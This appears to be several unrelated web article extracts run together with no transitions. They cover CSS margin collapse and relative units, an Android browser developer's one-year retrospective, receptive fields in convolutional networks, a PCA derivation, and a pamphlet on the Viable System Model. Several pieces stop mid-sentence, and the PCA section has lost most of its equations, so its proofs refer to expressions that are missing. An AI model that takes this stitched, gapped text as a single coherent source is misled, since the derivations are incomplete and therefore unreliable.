<p>If we have two block elements with <code>margin-bottom: 1em</code> on one element and <code>margin-top: 1.5em</code> on the element directly below it, the total space between the two elements would be <code>1.5em</code>.</p>

<p>We can see that here:</p>

                <p>When two margins meet, the larger margin absorbs the smaller margin. If the margins are the same value, they absorb each other.</p>

<p>As soon as we know this, <code>margin</code> calculations become easier. It might also change our approach to managing them, and that’s where something like <a href="https://cssfordesigners.com/articles/managing-vertical-margins-in-css">the Lobotomised Owl selector can be useful</a>.</p>

<p><strong>Note:</strong> Margins don’t collapse when the parent element is set to <code>display: grid</code> or <code>display: flex</code>.</p>

                <p>CSS stands for <strong>Cascading Style Sheets</strong>. It’s no surprise therefore that the <strong>cascade</strong> is one of the fundamental concepts of CSS.</p>

<p>Though we might be aware of how our own stylesheets interact with each other, we have to remember that there’s <strong>always a default browser stylesheet</strong>. This is loaded <em>before</em> any custom stylesheets, making it easy to redeclare existing values.</p>

<p>The declared styles vary by browser, but they’re the reason that, by default:</p>

<ul>
<li>Headings have different sizes</li>
<li>Text is black</li>
<li>Lists have bullet points</li>
<li>Elements have any <code>display</code> property (such as <code>block</code> or <code>inline</code>)</li>
</ul>

<p>And many other things.</p>

<p>Even if a website only has a single stylesheet, that stylesheet will always be merged with the browser’s default styles.</p>

                <p>Using pixels (<code>px</code>) is tempting because they’re simple to understand: declare <code>font-size: 24px</code> and the text will be <code>24px</code>. But that won’t provide a great user experience, particularly for users who resize content at <a href="https://adrianroselli.com/2019/12/responsive-type-and-zoom.html#Update02">the browser level</a> or zoom into content.</p>

<p>I started using <code>em</code> (and later <code>rem</code>) for font sizing early. It took much longer to feel comfortable using <code>em</code> and <code>rem</code> for other things such as <code>padding</code>, <code>margin</code>, <code>letter-spacing</code> and <code>border</code>.</p>

<p>Understanding the difference between <code>em</code> and <code>rem</code> is critical to making relative units manageable. For instance, we might use <code>em</code> for <code>@media</code> queries and vertical margins, but <code>rem</code> for consistent <code>border-width</code>.</p>

<p>The benefits of going all-in on relative sizing are well-worth the small adjustment in thinking that requires.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Snap Search completes one year today 🥳</p><p>To be absolutely correct, it’s been a year since Version 1.1.1 went live on the store, I’m not even sure when I started working on it – but I assume at least 1 week before release.</p><p>This has been an amazing journey. I’ve made many apps/websites/products before – but never have I been so committed to something for so long. I usually get ‘bored’ after releasing and barely hold on for a month or so.</p><p>I’m going to try to share as much as I can about the inception of the idea, the process, what I learnt, future plans and then some numbers 📈</p><p>BUT, before I start – if you don’t have Snap Search and you have an Android device – consider downloading it: <a aria-label="undefined (opens in a new tab)" href="https://play.google.com/store/apps/details?id=cybersky.snapsearch" target="_blank" rel="noreferrer noopener">Google Play Store</a>.</p> <h2>Why a Browser for Android??</h2><p>Building a browser for Android was never the plan. Snap Search did not start as a browser. The idea was born as a <a aria-label="undefined (opens in a new tab)" href="https://chrome.google.com/webstore/detail/snap-sarch/diidgminbhdappppdmgglehmdoeiaheg" target="_blank" rel="noreferrer noopener">browser extension</a>. I’ve made many apps before, but it was the first time I was making an extension. I had so much fun making that, I literally just wanted to make an Android version of Snap Search because I wanted that thrill. The extension currently follows the exact same format:</p><ul><li>Select your website/search engine</li><li>Enter your search term</li><li>Results will show in Incognito Mode</li></ul><p>However, on Android I could do much more. Incognito mode alone is <span>not</span> safe for browsing. I went a step ahead and did a lot more on Android because it was technically possible for me.</p><h2>The Process ♺</h2><p>Honestly, I do not have any process. May be if I had one I’d make better stuff or may be this just works for me – I’m not sure and I doubt I’ll ever find out. I’m more of a build first guy than plan first guy. This is a comparison of what the first version looked vs what it looks like now:</p><figure><img src="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1024/https://snapsearch.online/wp-content/uploads/2020/07/before-after-1024x890.png" data-src="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1024/https://snapsearch.online/wp-content/uploads/2020/07/before-after-1024x890.png" alt="Home screen for Snap Search before vs now" data-srcset="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1024/https://snapsearch.online/wp-content/uploads/2020/07/before-after-1024x890.png 1024w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_300/https://snapsearch.online/wp-content/uploads/2020/07/before-after-300x261.png 300w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_768/https://snapsearch.online/wp-content/uploads/2020/07/before-after-768x668.png 768w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1536/https://snapsearch.online/wp-content/uploads/2020/07/before-after-1536x1336.png 1536w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_2048/https://snapsearch.online/wp-content/uploads/2020/07/before-after-2048x1781.png 2048w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1160/https://snapsearch.online/wp-content/uploads/2020/07/before-after-1160x1009.png 1160w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_58/https://snapsearch.online/wp-content/uploads/2020/07/before-after-58x50.png 58w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_650/https://snapsearch.online/wp-content/uploads/2020/07/before-after-650x565.png 650w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1000/https://snapsearch.online/wp-content/uploads/2020/07/before-after-1000x870.png 1000w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_50/https://snapsearch.online/wp-content/uploads/2020/07/before-after-50x43.png 50w" data-sizes="(max-width: 1024px) 100vw, 1024px" srcset="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1024/https://snapsearch.online/wp-content/uploads/2020/07/before-after-1024x890.png 1024w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_300/https://snapsearch.online/wp-content/uploads/2020/07/before-after-300x261.png 300w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_768/https://snapsearch.online/wp-content/uploads/2020/07/before-after-768x668.png 768w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1536/https://snapsearch.online/wp-content/uploads/2020/07/before-after-1536x1336.png 1536w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_2048/https://snapsearch.online/wp-content/uploads/2020/07/before-after-2048x1781.png 2048w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1160/https://snapsearch.online/wp-content/uploads/2020/07/before-after-1160x1009.png 1160w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_58/https://snapsearch.online/wp-content/uploads/2020/07/before-after-58x50.png 58w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_650/https://snapsearch.online/wp-content/uploads/2020/07/before-after-650x565.png 650w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1000/https://snapsearch.online/wp-content/uploads/2020/07/before-after-1000x870.png 1000w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_50/https://snapsearch.online/wp-content/uploads/2020/07/before-after-50x43.png 50w"><figcaption>Before (left) v/s Now (right)</figcaption></figure><p>There were a couple of things I knew from the start about what I wanted this app to be and how I wanted it to be.</p><ol><li>I knew I wanted a Proxy Mode/VPN ability for those users who really wanted to be safe on the web. Doing so wasn’t going to be easy or cheap – and so I had to introduce a ‘Premium Mode’. Now, <a aria-label="undefined (opens in a new tab)" href="https://snapsearch.online/app-change-log/" target="_blank" rel="noreferrer noopener">27 releases later</a> there are multiple <a aria-label="undefined (opens in a new tab)" href="https://snapsearch.online/general/why-should-i-pay-for-premium-mode-of-snap-search/" target="_blank" rel="noreferrer noopener">reasons to buy a premium plan</a> for Snap Search.</li><li>The app should NEVER ask for permissions. No storage, no location, no gallery, no contacts – nothing. If any feature required it, I would have to find a way around it or Snap Search would just have to be a browser without it.</li><li>No ads on Snap Search. Personally, I hate ads.</li></ol><p>And so, I just kept building.</p><p>Most app updates involved introducing New Features and UI Improvements. I made myself understand a few things beforehand:</p><ul><li>It needs to look good or people won’t use it.</li><li>It needs to be unique or people won’t use it.</li><li>It needs to work as promised or people will hate it.</li></ul><p>I guess these are standard points for any application/platform/service. However, that doesn’t make it any less important. In fact, I made sure to remember the same every time I sat down to write code or work on the app.</p><h4>Deciding What To Do Next</h4><p>Have you heard of a concept called the “Writer’s Block”? I was scared I’d face something similar – like a “Developer’s Block” or “Maker’s Block”. After every update I’d sit down and think – Do I have anything to do for the next update?</p><p>I always had the option of just improving what is already there – which is a good thing to do obviously, but I wanted something new to add, whether it was a new feature or an update to the UI. The current browser is a result of just that. I didn’t think of the current design at the start, it came to look like this after changes again and again.

<p>In this article, we will discuss multiple perspectives that involve the receptive field of a deep convolutional architecture. We will address the influence of the receptive field starting for the human visual system. As you will see, a lot of terminology of deep learning comes from neuroscience. As a short motivation, convolutions are awesome but it is not enough just to understand how it works. <strong>The idea of the receptive field will help you dive into the architecture that you are using or developing</strong>. If you are looking for an in-depth analysis to understand how you can calculate the receptive field of your model as well as the most effective ways to increase it, this article was made for you. In the end, fundamentals are to be mastered! Let’s begin.</p>

<p>According to Wikipedia [1], the receptive field (of a biological neuron) is “<strong>the portion of the sensory space that can elicit neuronal responses, when stimulated”</strong>. The sensory space can be defined in any dimension (e.g. a 2D perceived image for an eye). Simply, the neuronal response can be defined as the firing rate (i.e. number of action potentials generated by a neuron). It is related to the time dimension based on the stimuli. What is important is that it affects the received frames per second (FPS) of our visual system. It is not clear what is the exact FPS of our visual system, and it is definitely changing in different situations (i.e. when we are in danger). Wikipedia [2] says:</p>

<blockquote>
  <p>Insight: The human visual system can process 10 to 12 images per second and perceive them individually, while higher rates are perceived as motion.</p>
</blockquote>

<p>Let’s observe this image to further clarify these concepts:</p>

<em>The visual human system. Source: <a href="https://brainconnection.brainhq.com/2004/03/06/overview-of-receptive-fields/" rel="noopener" target="_blank">brainconnection</a></em></p>

<p>Based on the image, the entire area (the grid in the figure) an eye can see is called the field of view. The human visual system consists of millions of neurons, where each one captures different information. We define the <strong>neuron’s receptive field</strong> as <strong>the patch</strong> of the total field of view. In other words, <strong>what information a single neuron has access to</strong>. This is in simple terms the biological cell’s receptive field.</p>

<p>Let’s see how we can extend this idea in convolutional networks.</p>

<h2 id="what-is-the-receptive-field-in-deep-learning">What is the receptive field in deep learning?</h2>

<p>Similarly, in a deep learning context, the Receptive Field (<strong>RF</strong>) is defined as <strong>the size of the region in the input that produces the feature</strong>[3]. Basically, it is a measure of association of an output feature (of any layer) to the input <strong>region</strong> (patch). Before we move on, let’s clarify one important thing:</p>

<blockquote>
  <p>Insight: The idea of receptive fields applies to local operations (i.e. convolution, pooling).</p>
</blockquote>

<p><img src="https://theaisummer.com/assets/img/posts/receptive-field/receptive-field-in-convolutional-networks.png" alt="receptive-field-in-convolutional-networks">
<em>Source: <a href="https://www.researchgate.net/figure/The-receptive-field-of-each-convolution-layer-with-a-3-3-kernel-The-green-area-marks_fig4_316950618" rel="noopener" target="_blank">Research Gate</a></em></p>

<p>A convolutional unit only depends on a local region (patch) of the input. That’s why we never refer to the RF on fully connected layers since each unit has access to all the input region. To this end, our aim is to provide you an insight into this concept, in order to understand and analyze how deep convolutional networks work with local operations work.</p>

<p>Ok, but why should anyone care about the RF?</p>

<h2 id="why-do-we-care-about-the-receptive-field-of-a-convolutional-network">Why do we care about the receptive field of a convolutional network?</h2>

<p>There is no better way to clarify this than a couple of computer vision examples. In particular, let’s revisit a couple of dense prediction computer vision tasks. Specifically, in <a href="https://theaisummer.com/Semantic_Segmentation/" target="_blank">image segmentation</a> and optical flow estimation, we produce a prediction for each pixel in the input image, which corresponds to a new image, the semantic label map. Ideally, we would like each output pixel of the label map to have a big receptive field, so as to ensure that no crucial information was <strong>not</strong> taken into account. For instance, if we want to predict the boundaries of an object (i.e. a car, an organ like the heart, a tumor) it is important that we provide the model access to all the relevant parts of the input object that we want to segment. In the image below, you can see two receptive fields: the green and the orange one. Which one would you like to have in your architecture?</p>

<p><img src="https://theaisummer.com/assets/img/posts/receptive-field/receptive-fields-semantic-segmentation.png" alt="receptive-fields-semantic-segmentation">
<em>The green and orange rectangles are two different receptive fields. Which one would you prefer? The green and orange rectangles are two different receptive fields. Which one would you prefer? ￼￼Source: <a href="https://developer.nvidia.com/blog/image-segmentation-using-digits-5/" rel="noopener" target="_blank">Nvidia’s blog</a></em></p>

<p>Similarly, in <a href="https://theaisummer.com/Localization_and_Object_Detection/" target="_blank">object detection</a>, a small receptive field may not be able to recognize large objects. That’s why you usually see multi-scale approaches in object detection. Furthermore, in motion-based tasks, like video prediction and optical flow estimation, we want to <strong>capture large motions</strong> (<strong>displacements</strong> of pixels in a 2D grid), so we want to have an adequate receptive field. Specifically, <strong>the receptive field should be sufficient if it is larger than the largest flow magnitude of the dataset</strong>.</p>

<p>Therefore, our goal is to design a convolutional model so that we ensure that <strong>its RF covers the entire relevant input image region</strong>.</p>

<p>To convince you even more, in the diagram below you can see the relation of the RF to the classification accuracy in ImageNet. The radius refers to the amount of floating-point operations (FLOPs) of each model. The purple corresponds to the ResNet [4] family (50-layer, 101, and 152 layers), while the yellow is the inception [5] family (v2, v3, v4). Light-blue is the MobileNet architecture.</p>

<p><img src="https://theaisummer.com/assets/img/posts/receptive-field/imagenet-classification-and-receptive-field.png" alt="imagenet-classification-and-receptive-field">
<em>Image is borrowed from Araujo et al. [3]</em></p>

<p>As perfectly described by Araujo et al. [3]:</p>

<blockquote>
  <p>“We observe a <strong>logarithmic relationship between classification accuracy and receptive field size</strong>, which suggests that large receptive fields are necessary for high-level recognition tasks, but with diminishing rewards.”</p>
</blockquote>

<p>Nevertheless, the receptive field size <strong>alone is not the only factor</strong> contributing to improved recognition performance. However, the point is that you should definitely be aware of your model’s receptive field.</p>

<p>Ok,  so how can we measure it?</p>

<h2 id="closed-form-calculations-of-the-receptive-field-for-single-path-networks">Closed-form calculations of the receptive field for single-path networks</h2>

<p>In the amazing work by Araujo et al. [3], they provide an intuitive way to calculate in an analytical form the RF of your model. A single path literally means no <a href="https://theaisummer.com/skip-connections/" target="_blank">skip connections</a> in the architecture, like the famous AlexNet. Let’s see some math! For two sequential convolutional layers \(f2 , f1\) with kernel size \(k\), stride \(s\), receptive field \(r\):</p><p>

\[r_1 = s_2 \times r_2 + (k_2-s_2)\]

</p><p>Or in a more general form:</p><p>

\[r_(i-1) = s_{i} \times r_{i} + (k_{i}-s_{i})\]

</p><p>The image below may help you clarify this equation. Note that <strong>we are interested to see the influence of the receptive field starting from the last layer towards the input</strong>. So, in that sense, we go backwards.</p>

<p><img src="https://theaisummer.com/assets/img/posts/receptive-field/receptive-field-1d-conv-visualization.png" alt="receptive-field-1d-conv-visualization">
<em>1D sequential conv. Layers visualization taken from Araujo et al. [3]</em></p>

<p>It seems like this equation can be generalized in a beautiful compact equation that simply applies this operation recursively for L layers. By further analyzing the recursive equation, we can derive a closed form solution that depends only on the convolutional parameters of kernels and strides [3]:</p><p>

\[r_0 = \sum_{i=1}^{L} ( (k_{i} -1) \prod_{j=1}^{l-1} s_{j}  ) + 1 \quad \quad (eq.1)\]

</p><p>Where \(r_0\) denoted the desired RF of the architecture.</p>

<p>Ok, I measured the <strong>theoretical RF</strong> of my model. Now, how can I increase it?</p>

<h2 id="how-can-we-increase-the-receptive-field-in-a-convolutional-network">How can we increase the receptive field in a convolutional network?</h2>

<p>In essence, there are a plethora of ways and tricks to increase the RF, that can be summarized as follows:</p>

<ol>
  <li>
    <p>Add more convolutional layers (make the network deeper)</p>
  </li>
  <li>
    <p>Add pooling layers or higher stride convolutions (sub-sampling)</p>
  </li>
  <li>
    <p>Use <a href="https://www.reddit.com/r/MachineLearning/comments/52drsq/what_is_dilated_convolution/" rel="noopener" target="_blank">dilated convolutions</a></p>
  </li>
  <li>
    <p>Depth-wise convolutions</p>
  </li>
</ol>

<p>Let’s look at the <strong>distinct characteristics</strong> of these approaches.</p>

<h4 id="add-more-convolutional-layers">Add more convolutional layers</h4>

<p>Option 1 increases the receptive field size <strong>linearly</strong>, as each extra layer increases the receptive field size by the kernel size [7]. Moreover, it is experimentally validated that as the theoretical receptive field is increasing but the effective (experimental) receptive field is reducing. RF refers to the RF, while ERF corresponds to the effective RF.</p>

<p><img src="https://theaisummer.com/assets/img/posts/receptive-field/Effective-receptive-field-ratio-with-more-layers.png" alt="Effective-receptive-field-ratio-with-more-layers">
<em>Increasing the number of layers decreases the ERF ration, taken from Luo et al. [7]</em></p>

<h4 id="sub-sampling-and-dilated-convolutions">Sub-sampling and dilated convolutions</h4>

<p><strong>Sub-sampling</strong> techniques like pooling (option 2) on the other hand, <strong>increases</strong> the receptive field size <strong>multiplicatively</strong>. Modern architectures like ResNet combine these techniques(option 1 and 2). On the other hand, sequentially placed dilated convolutions, <strong>increase the RF exponentially</strong>.</p>

<p>But first, let’s revisit the idea of dilated convolutions.</p>

<p>In essence, dilated convolutions introduce another parameter, denoted as r, called the dilation rate. <strong>Dilations introduce “holes” in a convolutional kernel</strong> [3]. The “holes” basically define a spacing between the values of the kernel. So, while the number of weights in the kernel is unchanged, the weights are no longer applied to spatially adjacent samples. Dilating a kernel by a factor of \(r\) introduces a kind of striding of \(r\).</p>

<p>The pre-described equations can be reused by simply replacing the kernel size \(k\) for all layers using dilations:</p><p>

\[k’= r (k−1)+1\]

</p><p>Keep this equation in the back of your mind.</p>

<p>All the above can be illustrated in the following gif, produced by Dumoulin et al. 2016 [11]. I think the image speaks for itself:</p>

      <h3 id="introduction">Introduction</h3>

<p>Principal components analysis (PCA) is one of a family of techniques for taking high-dimensional data, and using the dependencies between the variables to represent it in a more tractable, lower-dimensional form, without losing too much information. It has been widely used for data compression and de-noising. However, its entire mathematical process is sometimes ambiguous to the user.</p>



<p>In this article, I would like to discuss the entire process of PCA mathematically, including PCA projection and reconstruction, with most of the derivations and proofs provided. At the end of the article, I implemented PCA projection and reconstruction from scratch. After reading this article, there should be no more black box in PCA anymore.</p>

<h3 id="prerequisites">Prerequisites</h3>

<h4 id="orthogonal-matrix">Orthogonal Matrix</h4>

<p>In linear algebra, an orthogonal matrix is a real square matrix whose columns and rows are orthogonal unit vectors (orthonormal vectors).</p>



<p>Equivalently, the mathematical expression is</p>



<p>By <a href="https://en.wikipedia.org/wiki/Invertible_matrix">the definition of invertible matrix</a>, this means matrix $A$ is invertible and $A^{-1} = A^{\top}$.</p>



<p>We could also view this from the perspective of determinant.</p>



<p>Because $A$ and $A^{\top}$ are square matrices and using <a href="https://en.wikipedia.org/wiki/Determinant#Properties_of_the_determinant">the properties of determinant</a></p>



<p>Since $\det(A) \neq 0$, matrix $A$ is invertible. We multiply $A^{-1}$ on both side of the orthogonal matrix definition.</p>



<p>We have also derived the conclusion that $A^{-1} = A^{\top}$.</p>



<p>Similarly, a complex square matrix $A$ is unitary if its transpose conjugate $A^{\dagger}$ is also its inverse.</p>



<p>Equivalently, the mathematical expression is</p>



<h4 id="symmetric-matrix">Symmetric Matrix</h4>

<p>Real symmetric matrix has the following useful properties:</p>



<p>If $A$ is a real symmetric matrix, all of its eigenvalues are real numbers.</p>



<p>Because of <a href="https://en.wikipedia.org/wiki/Complex_conjugate#Generalizations">the conjugate properties</a> and $\overline{A} = A$ since $A$ is a real value matrix,</p>



<p>We got $A \overline{v} = \overline{\lambda} \overline{v}$.</p>



<p>Let $\lambda \in \mathbb{C}$ be an eigenvalue of the symmetric matrix $A$. $Av = \lambda v$ and $v \neq 0$. We multiply $v^{\dagger}$ ($v^{\dagger} = \overline{v}^{\top}$) to the both sides, and because of $A^{\top} = A$ and the property we have just derived $A \overline{v} = \overline{\lambda} \overline{v}$,</p>



<p>We have $\lambda v^{\dagger} v = \overline{\lambda} v^{\dagger} v$, thus $\lambda$ is real.</p>



<p>This concludes the proof.</p>

<h4 id="positive-semi-definite-matrix">Positive Semi-Definite Matrix</h4>

<p>The $n \times n$ symmetric matrix $A$ is defined to be positive semi-definite, if $x^{\dagger} A x \geq 0$ for $x \in \mathbb{C}^n$.</p>



<p>The positive semi-definite matrix has the following important property:</p>



<p>The eigenvalues of positive semi-definite matrix are non-negative.</p>



<p>Because $x^{\dagger} A x \geq$ for $x \in \mathbb{C}^n$, suppose $x$ is an eigenvector of $A$ and $Ax = \lambda x$ where $x \neq 0$,</p>



<p>Because $x^{\dagger} x$ must be real number and $x^{\dagger} x &gt; 0$, we have $\lambda \geq 0$.</p>



<p>This concludes the proof.</p>

<h4 id="covariance-matrix">Covariance Matrix</h4>

<p>The covariance matrix has the following important property:</p>



<p>Covariance matrix is positive semi-definite. This means that the eigenvalues of covariance matrix is non-negative.</p>



<p>The proof of that covariance must be positive semi-definite could be found in my previous post on <a href="https://leimao.github.io/blog/Multivariate-Gaussian-Covariance-Matrix/">Multivariate Gaussian and Covariance Matrix</a>.</p>

<h4 id="singular-values">Singular Values</h4>

<p>The singular values, $\sigma_1$, $\sigma_2$, $\cdots$, $\sigma_r$, of an $m \times n$ matrix $A$ are the square roots, $\sigma_i = \sqrt{\lambda_i}$, of non-negative eigenvalues of the associated Gram matrix $K = A^{\dagger}A$. The corresponding eigenvectors of $K$ are known as singular vectors of $A$.</p>



<p>Note that the associated Gram matrix $K = A^{\dagger}A$ is real and symmetric, so the eigenvalues of $K$ are all real.</p>



<p>$K = A^{\dagger}A$ is also positive semi-definite.</p>



<p>For any vector $x$</p>



<p>Because $Ax$ is also a vector,</p>



<p>Therefore, all the eigenvalues of $K = A^{\dagger}A$ are non-negative and they all have a corresponded singular value of $A$.</p>

<h4 id="singular-value-decomposition">Singular Value Decomposition</h4>

<p>In linear algebra, the singular value decomposition (SVD) is a factorization of a real or complex matrix that generalizes the eigendecomposition of a square normal matrix to any $ m\times n$ matrix via an extension of the polar decomposition.</p>



<p>Specifically, the singular value decomposition of an $m \times n$ real or complex matrix $M$ is a factorization of the form $U \Sigma V^{\dagger}$, where $U$ is an $m \times m$ real or complex unitary matrix, $\Sigma$ is a $m \times n$ rectangular diagonal matrix with non-negative real numbers on the diagonal, and $V$ is an $n \times n$ real or complex unitary matrix.</p>



<p>The diagonal entries $\sigma_{i}=\Sigma_{ii}$ of $\Sigma$ are known as the singular values of $M$. The number of non-zero singular values is equal to the rank of $M$.</p>



<p>In particular, for any matrix $A \in \mathbb{C}$,</p>



<p>We will skip the proof for why every matrix has SVD and the algorithm for SVD.</p>

<h4 id="singular-value-decomposition-for-norm-matrix">Singular Value Decomposition for Norm Matrix</h4>

<p>For any matrix $A \in \mathbb{C}$, $A^{\dagger} A$ could be expressed as</p>



<p>We multiply $V$ at both side of the equation.</p>



<p>Note that $\Sigma^{\dagger} \Sigma$ is a square diagonal matrix. Based on the definition of eigenvalue and eigenvectors, the diagonal values of $\Sigma^{\dagger} \Sigma$, including the zeros, are the eigenvalues of $A^{\dagger} A$. All the columns of $V$ are the corresponding eigenvectors of $A^{\dagger} A$.</p>



<p>Similarly, $A A^{\dagger}$ could be expressed as</p>



<p>Note that $\Sigma \Sigma^{\dagger}$ is a square diagonal matrix. Based on the definition of eigenvalue and eigenvectors, the diagonal values of $\Sigma \Sigma^{\dagger}$, including the zeros, are the eigenvalues of $A A^{\dagger}$. All the columns of $U$ are the corresponding eigenvectors of $A A^{\dagger}$.</p>

<h3 id="mathematics-of-principal-components-analysis">Mathematics of Principal Components Analysis</h3>

<p>We start with $p$-dimensional vectors, and want to summarize them by projecting down into a $q$-dimensional subspace, where $q \leq p$. Our summary will be the projection of the original vectors on to $q$ directions, the principal axes, which span the subspace.</p>

<h4 id="minimizing-projection-residuals">Minimizing Projection Residuals</h4>

<p>Given a dataset $X \in \mathbb{R}^{n \times p}$ whose row is the centered data vectors $x_i \in \mathbb{R}^p$ for $0 \leq i \leq n-1$ ($\sum_{i=0}^{n-1} x_{i} = 0$), if we have a unit vector $w \in \mathbb{R}^p$ ($|w| = 1$) and we project the all the data vectors to this unit vector $w$.</p>



<p>The length of projection for data vector $x_i$ on $w$, by definition, is</p>



<p>where $\langle x_i, w \rangle$ is the inner product of $x_i$ and $w$.</p>



<p>The projection vector for data vector $x_i$ on $w$ is $\langle x_i, w \rangle w$.</p>



<p>The residual, which is the distance from data vector $x_i$ to $w$, is the length of vector $x_i - \langle x_i, w \rangle w$.</p>



<p>Let’s check what the residual square $| x_i - \langle x_i, w \rangle w | ^2$ is.</p>



<p>The optimization goal of projection is to minimize mean squared error $\text{MSE}(w)$, which is the mean of the residual sum of squares.</p>



<p>Remember the relationship between variance and expected value, $\mathbb{V}(X) = \mathbb{E}(X^2) - \mathbb{E}(X)^2$, we have</p>



<p>So $\frac{1}{n} \sum_{i=0}^{n-1}  \langle x_i, w \rangle ^2$ is actually the variance of the inner product between data vector and the projection unit vector $\mathbb{V}\big(\langle x, w \rangle\big)$.</p>



<p>We further have another expression of $\text{MSE}(w)$.</p>



<p>Because $\mathbb{E}\big(\langle x, x \rangle\big)$ is not dependent on $w$, minimizing the mean of the residual sum of squares $\text{MSE}(w)$ turns out to be equivalent to maximizing the variance of the inner product between data vector and the projection unit vector.</p>



<p>The variance of the inner product between data vector and the projection unit vector could also be expressed using the dataset matrix $X$.</p>



<p>where $\frac{X^{\top} X}{n}$ is the covariance matrix of $X$.</p>



<p>If we project the data vectors to $q$ orthogonal unit vectors $w_0$, $w_1$, $\cdots$, $w_{q-1}$. These unit vectors assembled as columns to a matrix $W \in \mathbb{R}^{p \times q}$. Then our optimization goal becomes maximizing the residual sum of squares on all these projection vectors.</p>



<p>subject to</p>



<h4 id="maximizing-variance">Maximizing Variance</h4>

<p>Suppose we are projecting the data to $p$ orthonormal unit vectors $w \in \mathbb{R}^{p}$. These unit vectors assembled as columns to a matrix $W \in \mathbb{R}^{p \times p}$, and $W$ is a orthonormal matrix.</p>



<p>subject to</p>



<p>Let’s try to maximize one $\mathscr{L}(w) = w^{\top} X^{\top} X w$ first, and the constrain is $w^{\top} w = 1$. We would use Lagrange multiplier $\lambda$ to help us solve the optimization problem.</p>





<p>We set $\frac{\partial \mathscr{L}}{\lambda} = 0$ and $\frac{\partial \mathscr{L}}{w} = 0$, we get</p>



<p>So by definition, $\lambda$ and $w$ are the eigenvalue and eigenvector of matrix $X^{\top} X$.</p>



<p>Because $X^{\top} X$ is real symmetric matrix and positive semi-definite, all the eigenvalues of $X^{\top} X$ are non-negative.</p>



<p>$X^{\top} X$ has exact $p$ eigenvalues $\lambda_0, \lambda_1, \cdots, \lambda_{p-1}$ and their corresponding eigenvectors $w_0, w_1, \cdots, w_{p-1}$. The matrix $W$, which consists of the eigenvectors $w_0, w_1, \cdots, w_{p-1}$, happens to be the global maximum solution for $\mathscr{L}(W)$. The global maximum value for $\mathscr{L}(W)$ is the sum of non-negative eigenvalues.</p>



<p>Because these eigenvalues are non-negative, and their contribution to the global maximum could be sorted by their values.</p>



<p>We call the eigenvector corresponding to the largest eigenvalue the first principal axis, the eigenvector corresponding to the second largest eigenvalue the second principal axis, and so on.</p>



<p>Suppose we are projecting the data to $q$ orthonormal unit vectors $w \in \mathbb{R}^{p}$, and $q \leq p$. These unit vectors assembled as columns to a matrix $W \in \mathbb{R}^{p \times q}$. The optimization problem becomes maximizing the following equation.</p>



<p>subject to</p>



<p>However, the solution is obvious. We just have to pick the $q$ largest eigenvalues and their …</p></div></div>

    <section><p><label for="3d27763f-b8ee-4d8c-bfda-4d6f24650dfd">⇣</label><span>This article is also available <a href="#printable-pdf">in PDF form</a>, suitable for printing.</span>
    Organizing is difficult, and often exhausting work. It means bringing together
    strangers and facing a hostile environment along with them.</p><p>To help, this pamphlet introduces the structure for developing viable
    organizations. <strong>By viability, I mean the ability to adapt to
    and survive changes in the environment</strong>. The structure of viable organizations
    lets members share important information with those who need it, while filtering out noise.
    This ability to adapt and channel information allows for quick responses
    to danger or need, without losing sight of the big picture.</p><p>This structure has been used in many co-ops, as well as in the democratic revolution
    of 1970-1973 in Chile.</p></section><section><h2>The Viable System Model</h2><p>The Viable System Model (VSM) gives us this structure for building viable
    organizations. We can also use it to check if our organizations are set up to
    survive hostile environments. Any viable system should look like the VSM, so
    don’t be surprised if you are already doing a lot of what it suggests.</p><p>The VSM has six parts, called systems. These don’t need to be their own offices
    or committees, but every viable organization should somehow include all six
    functions.</p><figure><label for="570d29e8-2415-4b96-aa5f-fa0350c8f189">⇣</label><span>Diagram of the Viable System Model, as it appeared in Stafford Beer’s “Designing the System”</span><img src="https://vsru.org/static/img/VSM_Stafford_Beer.gif" alt="A diagram of the Viable System Model"></figure><ul><li><strong>System 1 (Activity)</strong> - The parts that actually DO something
    and interact with the environment. They’re like the muscles and
    organs in your body. If you have a community garden or a soup
    kitchen, those are separate System 1s. They should be able to “do
    their own thing,” as long as they’re working.</li><li><strong>System 2 (Coordination)</strong> - The parts that connect the System 1s to each other.
    They make sure the System 1s operate in a stable way and aren’t in conflict with
    each other. A system 2 could be the person running from the soup kitchen to the
    garden to tell them they need carrots.</li><li><strong>System 3 (Coherence)</strong> - The part that looks at all the System 1s and figures out
    how they could work better. They take info from all the System 1s, and figure
    out how the big picture comes together. This system could be a working group
    figuring out how much food to pick from the garden, and how much needs to come
    from outside.</li><li><strong>System 3* (Auditing)</strong> - The part that checks in on System 1s to get extra
    information about how things are running. This can take the form of an audit, or
    simply members of the System 1 checking their own processes. Audits should only
    happen on request of the System 1, or if the System 1 breaks an “intervention
    rule.” Otherwise, the auditors of System 3* should leave it alone.</li><li><strong>System 4 (Strategy)</strong> - System four has two key tasks for creating strategy.
    Firstly, it looks out to the environment. For example, this could be a person looking online
    for the cheapest pasta. Secondly, it plans for the future using its own
    observations and info from System 3. For example, a weekly meeting on important
    news within the organization. It also filters information for general policy and
    sends it on to System 5.</li><li><strong>System 5 (Ethos)</strong> - The part that makes the “big decisions” affecting the whole
    organization. These decisions are about what kind of organization the membership
    wants to be. Normally, System 5 should have very little to do because the other
    systems handle daily concerns. But when a big question like “should our
    organization use guns?” comes up, System 5 needs to make a decision. Everyone in
    the organization should contribute to System 5. This usually means calling a
